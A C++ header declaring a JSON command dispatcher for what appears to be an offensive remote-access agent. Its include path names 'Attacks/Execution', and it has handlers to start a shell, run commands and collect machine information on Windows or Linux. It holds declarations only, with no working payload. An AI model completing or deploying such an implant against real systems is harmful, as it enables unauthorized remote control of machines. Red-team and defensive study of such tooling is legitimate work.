#pragma once
#define NOMINMAX

#include <string_view>
#include <string>
#include <functional>
#include <unordered_map>
#include <memory>

#include <rapidjson/document.h>
#include "serialization/JsonUtils.h"   // generic helpers

#include "Attacks/Execution/Shell.hpp"

namespace CppAgent {

class CommandHandler
{
public:
    CommandHandler();

    /// Parse, validate and dispatch. Returns a full JSON string.
    [[nodiscard]]
    std::string handle(std::string_view requestJson);

private:
    // ---------------------------------------------------------------------
    // Dispatch table
    // ---------------------------------------------------------------------
    using HandlerFn = std::string (CommandHandler::*)(const rapidjson::Document&);
    std::unordered_map<int, HandlerFn> registry_;

    // ---------------------------------------------------------------------
    // Concrete handlers
    // ---------------------------------------------------------------------
    std::string onStartShell(const rapidjson::Document& req);
    std::string onRunCommand(const rapidjson::Document& req);
    std::string onGetBasicMachineInfo(const rapidjson::Document& req);

    // ---------------------------------------------------------------------
    // Small helpers
    // ---------------------------------------------------------------------
    std::string makeSuccess(const rapidjson::Value& data);
    std::string makeError  (const char* msg);

    // ---------------------------------------------------------------------
    // State
    // ---------------------------------------------------------------------
    bool shellRunning_{false};

#ifdef _WIN32
    std::unique_ptr<win32::Shell>   shell_;
    std::wstring                   current_sid_{};
#else
    std::unique_ptr<linux_os::Shell> shell_;
#endif

    enum Command : int {
        StartShell          = 1,
        RunCommand          = 2,
        GetBasicMachineInfo = 3
    };
};

} // namespace CppAgent
